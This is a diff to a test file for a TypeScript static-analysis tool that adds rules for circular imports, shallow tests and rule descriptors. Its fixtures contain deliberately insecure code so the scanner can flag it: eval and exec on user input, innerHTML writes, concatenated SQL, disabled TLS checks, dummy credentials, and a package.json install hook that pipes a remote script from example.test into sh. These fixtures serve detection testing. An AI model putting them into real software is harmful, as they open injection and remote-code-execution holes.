@@ -1,10 +1,11 @@
 import assert from "node:assert/strict";
+import { execFileSync } from "node:child_process";
 import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { chdir, cwd } from "node:process";
 import test from "node:test";
-import { analyse, renderReport } from "./cli.ts";
+import { analyse, renderReport, ruleDescriptors } from "./cli.ts";
 
 const expandedRuleIds = new Set([
   "complexity.npath",
@@ -12,6 +13,9 @@ const expandedRuleIds = new Set([
   "docs.missing-return-tag",
   "docs.stale-param-tag",
   "docs.useless-docblock",
+  "design.circular-import",
+  "design.deep-relative-import",
+  "design.large-module-concentration",
   "design.package-bin-missing",
   "design.package-bin-not-executable",
   "modernisation.double-cast",
@@ -45,8 +49,11 @@ const expandedRuleIds = new Set([
   "test-quality.exception-type-only",
   "test-quality.global-state-mutation",
   "test-quality.magic-number-assertion",
+  "test-quality.missing-nearby-test",
   "test-quality.mock-only-test",
+  "test-quality.no-throw-only-test",
   "test-quality.setup-bloat",
+  "test-quality.snapshot-only-test",
   "test-quality.trivial-assertion",
   "test-quality.unused-mock",
   "waste.commented-out-code",
@@ -783,6 +790,14 @@ test("global mutation", () => {
   assert.equal(process.env.NODE_ENV, "test");
 });
 
+test("snapshot only", () => {
+  expect(routeOrder("new", false)).toMatchSnapshot();
+});
+
+test("no throw only", () => {
+  assert.doesNotThrow(() => routeOrder("new", false));
+});
+
 test("setup bloat", () => {
   const one = buildOne();
   const two = buildTwo();
@@ -879,9 +894,65 @@ test("baseline round trip suppresses old and new findings by identity tuple", ()
       join(projectDir, "bad.ts"),
       `const embeddedToken = "Zx7pQ9vLm3N8sT2rY6wK1dF4gH5jC0bR2";
 
-function unsafe(userInput: string): void {
+export function unsafePublicApi(input: any): any {
+  // @ts-ignore
+  const user = input as unknown as { name?: string };
+  return user!.name;
+}
+
+async function unsafe(userInput: string, userIds: string[]): Promise<void> {
   eval(userInput);
   new Function(userInput)();
+  userIds.forEach(async (userId) => {
+    await sendEmailAsync(userId);
+  });
+  sendEmailAsync(userIds[0]);
+  try {
+    await sendEmailAsync("primary");
+  } catch (error) {
+    // ignored
+  }
+  throw "dynamic failure";
+}
+`,
+    );
+    writeFileSync(
+      join(projectDir, "package.json"),
+      JSON.stringify({
+        scripts: {
+          prepare: "curl https://example.test/install.sh | sh",
+        },
+        dependencies: {
+          "remote-tool": "git+https://github.com/example/remote-tool.git",
+        },
+      }),
+    );
+    writeFileSync(
+      join(projectDir, "tsconfig.json"),
+      JSON.stringify({
+        compilerOptions: {
+          strict: false,
+          noUncheckedIndexedAccess: false,
+          exactOptionalPropertyTypes: false,
+        },
+      }),
+    );
+    mkdirSync(join(projectDir, "src", "cycle"), { recursive: true });
+    writeFileSync(
+      join(projectDir, "src", "cycle", "a.ts"),
+      `import { fromB } from "./b";
+
+export function fromA(): string {
+  return fromB();
+}
+`,
+    );
+    writeFileSync(
+      join(projectDir, "src", "cycle", "b.ts"),
+      `import { fromA } from "./a";
+
+export function fromB(): string {
+  return fromA();
 }
 `,
     );
@@ -899,6 +970,12 @@ function unsafe(userInput: string): void {
     assert.equal(ruleIds.has("security.eval-call"), true);
     assert.equal(ruleIds.has("security.new-function"), true);
     assert.equal(ruleIds.has("sensitive-data.high-entropy-string"), true);
+    assert.equal(ruleIds.has("modernisation.double-cast"), true);
+    assert.equal(ruleIds.has("security.async-foreach"), true);
+    assert.equal(ruleIds.has("waste.swallowed-catch"), true);
+    assert.equal(ruleIds.has("security.remote-install-script"), true);
+    assert.equal(ruleIds.has("modernisation.tsconfig-strict-disabled"), true);
+    assert.equal(ruleIds.has("design.circular-import"), true);
 
     const baselinePath = join(baselineDir, "baseline.json");
     analyse({ ...baseOptions, generateBaseline: baselinePath });
@@ -963,6 +1040,135 @@ function unsafe(value: string): void {
     first.findings.map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.fingerprint]),
     second.findings.map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.fingerprint]),
   );
+});
+
+test("project architecture index finds deterministic cross-file findings", () => {
+  const files = {
+    "src/app/feature/controller.ts": `import { sharedValue } from "../../../shared/value";
+import { startCycle } from "../cycle/a";
+
+export function renderController(): string {
+  return sharedValue + startCycle();
+}
+`,
+    "src/app/cycle/a.ts": `import { fromB } from "./b";
+
+export function startCycle(): string {
+  return fromB();
+}
+`,
+    "src/app/cycle/b.ts": `import { startCycle } from "./a";
+
+export function fromB(): string {
+  return startCycle();
+}
+`,
+    "src/shared/value.ts": `export const sharedValue = "shared";
+`,
+    "src/large.ts": Array.from({ length: 20 }, (_, index) => `export const largeValue${index} = ${index};`).join("\n"),
+  };
+  const config = {
+    rules: {
+      "design.large-module-concentration": { thresholds: { minFiles: 4, minLines: 8, maxSharePercent: 40 } },
+    },
+  };
+  const first = analyseProject(files, { config });
+  const second = analyseProject(files, { config });
+  const ruleIds = new Set(first.findings.map((finding) => finding.ruleId));
+  assert.equal(ruleIds.has("design.deep-relative-import"), true);
+  assert.equal(ruleIds.has("design.circular-import"), true);
+  assert.equal(ruleIds.has("design.large-module-concentration"), true);
+  assert.deepEqual(
+    first.findings
+      .filter((finding) => finding.ruleId.startsWith("design."))
+      .map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.symbol, finding.fingerprint]),
+    second.findings
+      .filter((finding) => finding.ruleId.startsWith("design."))
+      .map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.symbol, finding.fingerprint]),
+  );
+});
+
+test("circular import finding is stable across source iteration order", () => {
+  const first = analyseProject({
+    "src/cycle/a.ts": `import { fromB } from "./b";
+export function fromA(): string {
+  return fromB();
+}
+`,
+    "src/cycle/b.ts": `import { fromA } from "./a";
+export function fromB(): string {
+  return fromA();
+}
+`,
+  });
+  const second = analyseProject({
+    "src/cycle/b.ts": `import { fromA } from "./a";
+export function fromB(): string {
+  return fromA();
+}
+`,
+    "src/cycle/a.ts": `import { fromB } from "./b";
+export function fromA(): string {
+  return fromB();
+}
+`,
+  });
+  const firstCycle = first.findings.find((finding) => finding.ruleId === "design.circular-import");
+  const secondCycle = second.findings.find((finding) => finding.ruleId === "design.circular-import");
+  assert.ok(firstCycle);
+  assert.ok(secondCycle);
+  assert.deepEqual(
+    [firstCycle.filePath, firstCycle.line, firstCycle.symbol, firstCycle.fingerprint],
+    [secondCycle.filePath, secondCycle.line, secondCycle.symbol, secondCycle.fingerprint],
+  );
+});
+
+test("project test adequacy checks nearby coverage and shallow tests", () => {
+  const report = analyseProject({
+    "src/payments.ts": `export function chargeCard(): string {
+  return "charged";
+}
+`,
+    "src/users.ts": `export function renderUser(): string {
+  return "user";
+}
+`,
+    "src/users.test.ts": `import assert from "node:assert/strict";
+import { renderUser } from "./users";
+
+test("renders user", () => {
+  assert.equal(renderUser(), "user");
+});
+
+test("snapshot only", () => {
+  expect(renderUser()).toMatchSnapshot();
+});
+
+test("no throw only", () => {
+  assert.doesNotThrow(() => renderUser());
+});
+`,
+    "src/types.d.ts": `export interface GeneratedContract {
+  id: string;
+}
+`,
+    "fixtures/sample.ts": `export function fixtureOnly(): string {
+  return "fixture";
+}
+`,
+    "src/generated/client.ts": `export function generatedClient(): string {
+  return "generated";
+}
+`,
+  });
+  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
+  assert.equal(ruleIds.has("test-quality.missing-nearby-test"), true);
+  assert.equal(ruleIds.has("test-quality.snapshot-only-test"), true);
+  assert.equal(ruleIds.has("test-quality.no-throw-only-test"), true);
+  assert.equal(ruleIds.has("test-quality.no-assertions"), false);
+
+  const missingTestPaths = report.findings.filter((finding) => finding.ruleId === "test-quality.missing-nearby-test").map((finding) => finding.filePath);
+  assert.deepEqual(missingTestPaths, ["src/payments.ts"]);
 });
 
 test("expanded scanner config disables and overrides new rules", () => {
@@ -1124,6 +1330,14 @@ test("global mutation", () => {
   assert.equal(process.env.NODE_ENV, "test");
 });
 
+test("snapshot only", () => {
+  expect(routeOrder("new", false)).toMatchSnapshot();
+});
+
+test("no throw only", () => {
+  assert.doesNotThrow(() => routeOrder("new", false));
+});
+
 test("setup bloat", () => {
   const one = buildOne();
   const two = buildTwo();
@@ -1136,6 +1350,28 @@ test("setup bloat", () => {
   const nine = buildNine();
   expect(one).toBeDefined();
 });
+`,
+    "src/app/feature/controller.ts": `import { sharedHelper } from "../../../shared/helper";
+
+export function renderController(): string {
+  return sharedHelper();
+}
+`,
+    "src/cycle/a.ts": `import { fromB } from "./b";
+
+export function fromA(): string {
+  return fromB();
+}
+`,
+    "src/cycle/b.ts": `import { fromA } from "./a";
+
+export function fromB(): string {
+  return fromA();
+}
+`,
+    "src/shared/helper.ts": `export function sharedHelper(): string {
+  return "shared";
+}
 `,
     ".env": `API_TOKEN=rN7pQ4sV9xY2zA5bC8dG9hK2mN5pQ8sR1
 OPENAI_API_KEY=sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz1234567890
@@ -1168,12 +1404,80 @@ PATIENT_SSN=123-45-6789
   for (const ruleId of expandedRuleIds) {
     assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
   }
+  const descriptorIds = new Set(ruleDescriptors().map((descriptor) => descriptor.ruleId));
+  for (const ruleId of ruleIds) {
+    assert.equal(descriptorIds.has(ruleId), true, `missing descriptor for emitted rule ${ruleId}`);
+  }
   assert.equal(new Set(report.findings.map((finding) => finding.fingerprint)).size, report.findings.length);
 
   const sampleMessages = new Map(report.findings.filter((finding) => expandedRuleIds.has(finding.ruleId)).map((finding) => [finding.ruleId, finding.message]));
   assert.match(sampleMessages.get("security.new-function") ?? "", /dynamic code/);
   assert.match(sampleMessages.get("test-quality.setup-bloat") ?? "", /setup lines/);
   assert.match(sampleMessages.get("sensitive-data.hardcoded-env-value") ?? "", /Redacted preview/);
+});
+
+test("rule descriptors cover emitted rules and fixture-backed coverage", () => {
+  const descriptors = ruleDescriptors();
+  const descriptorIds = descriptors.map((descriptor) => descriptor.ruleId);
+  assert.deepEqual(descriptorIds, [...descriptorIds].sort());
+  assert.equal(new Set(descriptorIds).size, descriptorIds.length);
+
+  for (const descriptor of descriptors) {
+    assert.match(descriptor.ruleId, /^[a-z-]+\.[a-z0-9-]+$/);
+    assert.ok(descriptor.description.length > 10, `description for ${descriptor.ruleId}`);
+    assert.ok(descriptor.remediation.length > 10, `remediation for ${descriptor.ruleId}`);
+    if (descriptor.thresholdKeys) {
+      assert.deepEqual(descriptor.thresholdKeys, [...descriptor.thresholdKeys].sort(), `threshold key ordering for ${descriptor.ruleId}`);
+      assert.equal(new Set(descriptor.thresholdKeys).size, descriptor.thresholdKeys.length, `threshold key uniqueness for ${descriptor.ruleId}`);
+    }
+  }
+
+  const coverageIds = ruleCatalogueCoverageRuleIds();
+  const descriptorIdSet = new Set(descriptorIds);
+  for (const ruleId of coverageIds) {
+    assert.equal(descriptorIdSet.has(ruleId), true, `missing descriptor for emitted rule ${ruleId}`);
+  }
+  for (const descriptor of descriptors) {
+    if (descriptor.fixtureExemption) {
+      assert.ok(descriptor.fixtureExemption.length > 10, `fixture exemption reason for ${descriptor.ruleId}`);
+      continue;
+    }
+    assert.equal(coverageIds.has(descriptor.ruleId), true, `missing positive fixture coverage for ${descriptor.ruleId}`);
+  }
+});
+
+test("rule descriptor threshold keys match implementation and config defaults", () => {
+  const descriptors = ruleDescriptors();
+  const descriptorThresholds = new Map(
+    descriptors.filter((descriptor) => (descriptor.thresholdKeys ?? []).length > 0).map((descriptor) => [descriptor.ruleId, [...(descriptor.thresholdKeys ?? [])].sort()]),
+  );
+  const implementationThresholds = thresholdUsages(readFileSync("src/cli.ts", "utf8"));
+  assert.deepEqual(descriptorThresholds, implementationThresholds);
+
+  const configThresholds = yamlThresholdDefaults(readFileSync(".gruff.yaml", "utf8"));
+  assert.deepEqual(configThresholds, descriptorThresholds);
+  for (const [ruleId, keys] of configThresholds) {
+    assert.deepEqual(descriptorThresholds.get(ruleId), keys, `config threshold keys for ${ruleId}`);
+  }
+});
+
+test("list-rules CLI prints text and deterministic json", () => {
+  const text = execFileSync("./bin/gruff-ts", ["list-rules"], { encoding: "utf8" });
+  assert.match(text, /gruff-ts 0\.1\.0-dev rules \(\d+\)/);
+  assert.match(text, /security\.eval-call \| security \| error \| high \|/);
+  assert.match(text, /complexity\.npath \| complexity \| warning \| medium \| .*thresholds: error,warn/);
+
+  const firstJsonText = execFileSync("./bin/gruff-ts", ["list-rules", "--format=json"], { encoding: "utf8" });
+  const secondJsonText = execFileSync("./bin/gruff-ts", ["list-rules", "--format=json"], { encoding: "utf8" });
+  assert.equal(firstJsonText, secondJsonText);
+  const parsed = JSON.parse(firstJsonText) as {
+    schemaVersion?: string;
+    tool?: { name?: string; version?: string };
+    rules?: Array<{ ruleId?: string; pillar?: string; severity?: string; confidence?: string; description?: string; thresholdKeys?: string[] }>;
+  };
+  assert.equal(parsed.schemaVersion, undefined);
+  assert.equal(parsed.tool?.name, "gruff-ts");
+  assert.equal(parsed.rules?.some((rule) => rule.ruleId === "design.deep-relative-import" && rule.thresholdKeys?.includes("maxParentSegments")), true);
 });
 
 test("json report uses schema version", () => {
@@ -1240,4 +1544,300 @@ function analyseProject(files: Record<string, string>, options: AnalyseProjectOp
     chdir(previous);
     rmSync(dir, { recursive: true, force: true });
   }
+}
+
+function ruleCatalogueCoverageRuleIds(): Set<string> {
+  const report = analyseProject(
+    {
+      "src/catalogue.ts": `import { createHash } from "node:crypto";
+import { exec } from "node:child_process";
+import { unusedThing } from "./dep";
+
+// TODO: collapse this coverage fixture when generated rule docs exist.
+// const disabledLegacy = runLegacyPath();
+const data1 = "placeholder";
+const strName = "Ada";
+const active = true;
+const xx = 1;
+const unsafeAny: any = {};
+const embeddedToken = "Zx7pQ9vLm3N8sT2rY6wK1dF4gH5jC0bR2";
+const maybeUser = { name: strName };
+const optionalName = maybeUser && maybeUser.name;
+const fallbackName = maybeUser.name || "anonymous";
+var legacyName = fallbackName;
+
+export type PublicAny = any;
+
+export class WrongName {
+  public status = "ready";
+  private count: number;
+
+  public constructor() {
+    this.count = xx;
+  }
+
+  private hidden(): void {
+    console.log(this.count);
+  }
+}
+
+export function process(flag: boolean, userInput: string, userId: string, userIds: string[], unusedFlag: boolean): string {
+  eval(userInput);
+  new Function(userInput)();
+  setTimeout("alert(1)", 10);
+  exec(userInput);
+  Math.random();
+  document.write(userInput);
+  element.innerHTML = userInput;
+  createHash("md5").update(userInput);
+  process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
+  db.query("SELECT * FROM users WHERE id = " + userId);
+  userIds.forEach(async (id) => {
+    await sendEmailAsync(id);
+  });
+  sendEmailAsync(userIds[0]);
+  try {
+    riskyWork();
+  } catch (error) {
+    // ignored
+  }
+  if (flag) {
+    if (userId) {
+      return optionalName;
+    }
+  } else if (legacyName) {
+    return legacyName;
+  }
+  if (userId === "a") {
+    return "a";
+  }
+  if (userId === "b") {
+    return "b";
+  }
+  if (userId === "c") {
+    return "c";
+  }
+  if (userId === "d") {
+    return "d";
+  }
+  if (userId === "e") {
+    return "e";
+  }
+  if (userId === "f") {
+    return "f";
+  }
+  if (userId === "g") {
+    return "g";
+  }
+  if (userId === "h") {
+    return "h";
+  }
+  if (userId === "i") {
+    return "i";
+  }
+  throw "dynamic failure";
+  console.log(unsafeAny);
+}
+
+function emptyWork(): void {}
+
+function redundantResult(): string {
+  const calculated = fallbackName;
+  return calculated;
+}
+
+/**
+ * score amount
+ * @param stale Removed parameter.
+ */
+export function scoreAmount(amount: number): number {
+  return amount + redundantResult().length;
+}
+
+export function unsafePublicApi(input: any): any {
+  // @ts-ignore
+  const user = input as unknown as { name?: string };
+  return user!.name;
+}
+`,
+      "src/dep.ts": `export const usedThing = "used";
+`,
+      "src/catalogue.test.ts": `import assert from "node:assert/strict";
+
+function renderCatalogue(): string {
+  return "catalogue";
+}
+
+test("no assertion", () => {
+  const value = renderCatalogue();
+});
+
+test("trivial assertion", () => {
+  assert.equal(1, 1);
+});
+
+test("snapshot only", () => {
+  expect(renderCatalogue()).toMatchSnapshot();
+});
+
+test("no throw only", () => {
+  assert.doesNotThrow(() => renderCatalogue());
+});
+
+test("magic assertion", () => {
+  const total = 7;
+  expect(total).toBe(42);
+});
+
+test("unused mock", () => {
+  const unusedMock = jest.fn();
+  assert.ok(true);
+});
+
+test("mock only", () => {
+  const serviceMock = vi.fn();
+  serviceMock();
+  expect(serviceMock).toHaveBeenCalled();
+});
+
+test("exception type only", () => {
+  expect(() => fail()).toThrow(Error);
+});
+
+test("global mutation", () => {
+  process.env.NODE_ENV = "test";
+  assert.equal(process.env.NODE_ENV, "test");
+});
+
+test("setup bloat and control flow", () => {
+  const one = buildOne();
+  const two = buildTwo();
+  const three = buildThree();
+  if (one) {
+    for (const item of [one, two, three]) {
+      sleep(item);
+    }
+  }
+  setTimeout(() => undefined, 1);
+  test.only("nested focus marker", () => undefined);
+  assert.equal(one, one);
+});
+`,
+      "src/app/feature/controller.ts": `import { sharedHelper } from "../../../shared/helper";
+
+export function renderController(): string {
+  return sharedHelper();
+}
+`,
+      "src/cycle/a.ts": `import { fromB } from "./b";
+
+export function fromA(): string {
+  return fromB();
+}
+`,
+      "src/cycle/b.ts": `import { fromA } from "./a";
+
+export function fromB(): string {
+  return fromA();
+}
+`,
+      "src/shared/helper.ts": `export function sharedHelper(): string {
+  return "shared";
+}
+`,
+      "src/untested.ts": `export function untestedValue(): string {
+  return "untested";
+}
+`,
+      ".env": `AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP
+PRIVATE_KEY=-----BEGIN PRIVATE KEY-----
+DATABASE_URL=postgres://user:secret@example.test/db
+JWT_TOKEN=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.signature
+OPENAI_API_KEY=sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz1234567890
+PATIENT_SSN=123-45-6789
+API_TOKEN=rN7pQ4sV9xY2zA5bC8dG9hK2mN5pQ8sR1
+`,
+      "package.json": JSON.stringify({
+        scripts: {
+          postinstall: "node scripts/setup.js",
+          prepare: "curl https://example.test/install.sh | sh",
+        },
+        bin: {
+          "missing-cli": "./bin/missing.js",
+          "bad-cli": "./bin/bad.js",
+        },
+        dependencies: {
+          "wide-open": "*",
+          "remote-tool": "git+https://github.com/example/remote-tool.git",
+        },
+      }),
+      "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
+      "tsconfig.json": JSON.stringify({
+        compilerOptions: {
+          strict: false,
+          noUncheckedIndexedAccess: false,
+          exactOptionalPropertyTypes: false,
+        },
+      }),
+    },
+    {
+      config: {
+        rules: {
+          "complexity.cognitive": { thresholds: { warn: 3 } },
+          "complexity.cyclomatic": { thresholds: { warn: 2, error: 50 } },
+          "complexity.npath": { thresholds: { warn: 2, error: 100 } },
+          "design.large-module-concentration": { thresholds: { minFiles: 4, minLines: 8, maxSharePercent: 35 } },
+          "docs.todo-density": { thresholds: { markers: 1 } },
+          "size.file-length": { thresholds: { warn: 8, error: 500 } },
+          "size.function-length": { thresholds: { warn: 8, error: 500 } },
+          "size.parameter-count": { thresholds: { warn: 3 } },
+          "test-quality.setup-bloat": { thresholds: { maxSetupLines: 2 } },
+        },
+      },
+    },
+  );
+  return new Set(report.findings.map((finding) => finding.ruleId));
+}
+
+function thresholdUsages(source: string): Map<string, string[]> {
+  const usages = new Map<string, Set<string>>();
+  for (const match of source.matchAll(/threshold\(config,\s*"([^"]+)",\s*"([^"]+)"/g)) {
+    const ruleId = match[1] ?? "";
+    const key = match[2] ?? "";
+    usages.set(ruleId, usages.get(ruleId) ?? new Set<string>());
+    usages.get(ruleId)?.add(key);
+  }
+  return new Map([...usages.entries()].sort(([left], [right]) => left.localeCompare(right)).map(([ruleId, keys]) => [ruleId, [...keys].sort()]));
+}
+
+function yamlThresholdDefaults(source: string): Map<string, string[]> {
+  const result = new Map<string, string[]>();
+  let inRules = false;
+  let currentRule = "";
+  let inThresholds = false;
+  for (const line of source.split(/\r?\n/)) {
+    if (line.trim() === "rules:") {
+      inRules = true;
+      continue;
+    }
+    if (!inRules) {
+      continue;
+    }
+    const ruleMatch = line.match(/^  ([a-z-]+\.[a-z0-9-]+):\s*$/);
+    if (ruleMatch?.[1]) {
+      currentRule = ruleMatch[1];
+      inThresholds = false;
+      continue;
+    }
+    if (currentRule && line.match(/^    thresholds:\s*$/)) {
+      inThresholds = true;
+      result.set(currentRule, []);
+      continue;
+    }
+    const keyMatch = line.match(/^      ([A-Za-z0-9_-]+):/);
+    if (currentRule && inThresholds && keyMatch?.[1]) {
+      result.get(currentRule)?.push(keyMatch[1]);
+    }
+  }
+  return new Map([...result.entries()].sort(([left], [right]) => left.localeCompare(right)).map(([ruleId, keys]) => [ruleId, keys.sort()]));
 }
